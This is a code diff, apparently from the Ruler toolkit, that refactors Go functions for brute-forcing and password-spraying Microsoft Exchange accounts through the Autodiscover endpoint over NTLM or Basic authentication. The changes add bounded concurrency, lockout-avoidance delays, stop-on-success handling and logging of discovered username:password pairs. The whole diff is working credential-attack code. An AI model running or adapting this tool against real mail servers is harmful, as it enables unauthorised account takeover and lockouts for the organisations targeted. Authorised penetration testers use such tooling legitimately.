@@ -4,14 +4,16 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
-    "net/http/cookiejar"
+	"net/http/cookiejar"
 	"regexp"
 	"strings"
 	"time"
 
 	"github.com/sensepost/ruler/http-ntlm"
+	"github.com/sensepost/ruler/utils"
 )
 
+//Result struct holds the result of a bruteforce attempt
 type Result struct {
 	Username string
 	Password string
@@ -20,7 +22,7 @@ type Result struct {
 	Error    error
 }
 
-//var autodiscoverStep int = 0
+var concurrency = 5 //limit the number of consecutive attempts
 
 func autodiscoverDomain(domain string) string {
 	var autodiscoverURL string
@@ -50,7 +52,7 @@ func autodiscoverDomain(domain string) string {
 		}
 	}
 
-	fmt.Printf("[*] Autodiscover step %d - URL: %s\n", autodiscoverStep, autodiscoverURL)
+	utils.Trace.Printf("Autodiscover step %d - URL: %s\n", autodiscoverStep, autodiscoverURL)
 
 	req, err := http.NewRequest("GET", autodiscoverURL, nil)
 	req.Header.Add("Content-Type", "text/xml")
@@ -78,7 +80,7 @@ func autodiscoverDomain(domain string) string {
 //BruteForce function takes a domain/URL, file path to users and filepath to passwords whether to use BASIC auth and to trust insecure SSL
 //And whether to stop on success
 func BruteForce(domain, usersFile, passwordsFile string, basic, insecure, stopSuccess, verbose bool, consc, delay int) {
-	fmt.Println("[*] Trying to Autodiscover domain")
+	utils.Info.Println("[*] Trying to Autodiscover domain")
 	autodiscoverURL := autodiscoverDomain(domain)
 
 	if autodiscoverURL == "" {
@@ -93,56 +95,63 @@ func BruteForce(domain, usersFile, passwordsFile string, basic, insecure, stopSu
 		return
 	}
 
-	result := make(chan Result)
-	count := 0
 	attempts := 0
+	stp := false
 
 	for _, p := range passwords {
 		if p != "" {
 			attempts++
 		}
-		count = 0
+		sem := make(chan bool, concurrency)
+
 		for ui, u := range usernames {
 			if u == "" || p == "" {
 				continue
 			}
-			count++
+
+			sem <- true
+
 			go func(u string, p string, i int) {
+				defer func() { <-sem }()
 				out := connect(autodiscoverURL, u, p, basic, insecure)
 				out.Index = i
-				result <- out
-			}(u, p, ui)
-		}
 
-		for i := 0; i < count; i++ {
-			select {
-			case res := <-result:
-				if verbose == true && res.Status != 200 {
-					fmt.Printf("[x] Failed: %s:%s\n", res.Username, res.Password)
-					if res.Error != nil {
-						fmt.Printf("[x] An error occured in connection - %s\n", res.Error)
+				if verbose == true && out.Status != 200 {
+					utils.Fail.Printf("Failed: %s:%s\n", out.Username, out.Password)
+					if out.Error != nil {
+						utils.Error.Printf("An error occured in connection - %s\n", out.Error)
 					}
 				}
-				if res.Status == 200 {
-					fmt.Printf("\033[96m[+] Success: %s:%s\033[0m\n", res.Username, res.Password)
+				if out.Status == 200 {
+					utils.Info.Printf("\033[96mSuccess: %s:%s\033[0m\n", out.Username, out.Password)
 					//remove username from username list (we don't need to brute something we know)
-					usernames = append(usernames[:res.Index], usernames[res.Index+1:]...)
+					usernames = append(usernames[:out.Index], usernames[out.Index+1:]...)
+					if stopSuccess == true {
+						stp = true
+
+					}
 				}
-				if stopSuccess == true && res.Status == 200 {
-					return
-				}
-			}
+			}(u, p, ui)
+
 		}
+		if stp == true {
+			return
+		}
+		for i := 0; i < cap(sem); i++ {
+			sem <- true
+		}
+
 		if attempts == consc {
-			fmt.Printf("\033[31m[*] Multiple attempts. To prevent lockout - delaying for %d minutes.\033[0m\n", delay)
+			utils.Info.Printf("\033[31m[*] Multiple attempts. To prevent lockout - delaying for %d minutes.\033[0m\n", delay)
 			time.Sleep(time.Minute * (time.Duration)(delay))
 			attempts = 0
 		}
 	}
 }
 
+//UserPassBruteForce function does a bruteforce using a supplied user:pass file
 func UserPassBruteForce(domain, userpassFile string, basic, insecure, stopSuccess, verbose bool, consc, delay int) {
-	fmt.Println("[*] Trying to Autodiscover domain")
+	utils.Info.Println("[*] Trying to Autodiscover domain")
 	autodiscoverURL := autodiscoverDomain(domain)
 
 	if autodiscoverURL == "" {
@@ -153,9 +162,9 @@ func UserPassBruteForce(domain, userpassFile string, basic, insecure, stopSucces
 		return
 	}
 
-	result := make(chan Result)
 	count := 0
-
+	sem := make(chan bool, concurrency)
+	stp := false
 	for _, up := range userpass {
 		count++
 		if up == "" {
@@ -164,7 +173,7 @@ func UserPassBruteForce(domain, userpassFile string, basic, insecure, stopSucces
 		// verify colon-delimited username:password format
 		s := strings.SplitN(up, ":", 2)
 		if len(s) < 2 {
-			fmt.Printf("[!] Skipping improperly formatted entry in %s:%d\n", userpassFile, count)
+			utils.Fail.Printf("[!] Skipping improperly formatted entry in %s:%d\n", userpassFile, count)
 			continue
 		}
 		u, p := s[0], s[1]
@@ -175,26 +184,31 @@ func UserPassBruteForce(domain, userpassFile string, basic, insecure, stopSucces
 			continue
 		}
 
-		go func(u string, p string) {
-			out := connect(autodiscoverURL, u, p, basic, insecure)
-			result <- out
-		}(u, p)
+		sem <- true
 
-		select {
-		case res := <-result:
-			if verbose == true && res.Status != 200 {
-				fmt.Printf("[x] Failed: %s:%s\n", res.Username, res.Password)
-				if res.Error != nil {
-					fmt.Printf("[x] An error occured in connection - %s\n", res.Error)
+		go func(u string, p string) {
+			defer func() { <-sem }()
+			out := connect(autodiscoverURL, u, p, basic, insecure)
+			if verbose == true && out.Status != 200 {
+				utils.Fail.Printf("Failed: %s:%s\n", out.Username, out.Password)
+				if out.Error != nil {
+					utils.Error.Printf("An error occured in connection - %s\n", out.Error)
 				}
 			}
-			if res.Status == 200 {
-				fmt.Printf("\033[96m[+] Success: %s:%s\033[0m\n", res.Username, res.Password)
+			if out.Status == 200 {
+				utils.Info.Printf("\033[96mSuccess: %s:%s\033[0m\n", out.Username, out.Password)
 			}
-			if stopSuccess == true && res.Status == 200 {
-				return
+			if out.Status == 200 && stopSuccess == true {
+				stp = true
 			}
-		}
+		}(u, p)
+
+	}
+	if stp == true {
+		return
+	}
+	for i := 0; i < cap(sem); i++ {
+		sem <- true
 	}
 }
 
@@ -203,7 +217,7 @@ func readFile(filename string) []string {
 
 	data, err := ioutil.ReadFile(filename)
 	if err != nil {
-		fmt.Println("Input file not found")
+		utils.Error.Println("Input file not found")
 		return nil
 	}
 
@@ -215,18 +229,19 @@ func readFile(filename string) []string {
 
 func connect(autodiscoverURL, user, password string, basic, insecure bool) Result {
 	result := Result{user, password, -1, -1, nil}
-    cookie, _ := cookiejar.New(nil)
+
+	cookie, _ := cookiejar.New(nil)
 	client := http.Client{}
 	if basic == false {
 		//check if this is a first request or a redirect
 		//create an ntml http client
 		client = http.Client{
 			Transport: &httpntlm.NtlmTransport{
-				Domain:   "",
-				User:     user,
-				Password: password,
-				Insecure: insecure,
-                CookieJar: cookie,
+				Domain:    "",
+				User:      user,
+				Password:  password,
+				Insecure:  insecure,
+				CookieJar: cookie,
 			},
 		}
 	}
@@ -254,6 +269,7 @@ func connect(autodiscoverURL, user, password string, basic, insecure bool) Resul
 	}
 
 	defer resp.Body.Close()
+
 	result.Status = resp.StatusCode
 	return result
 }
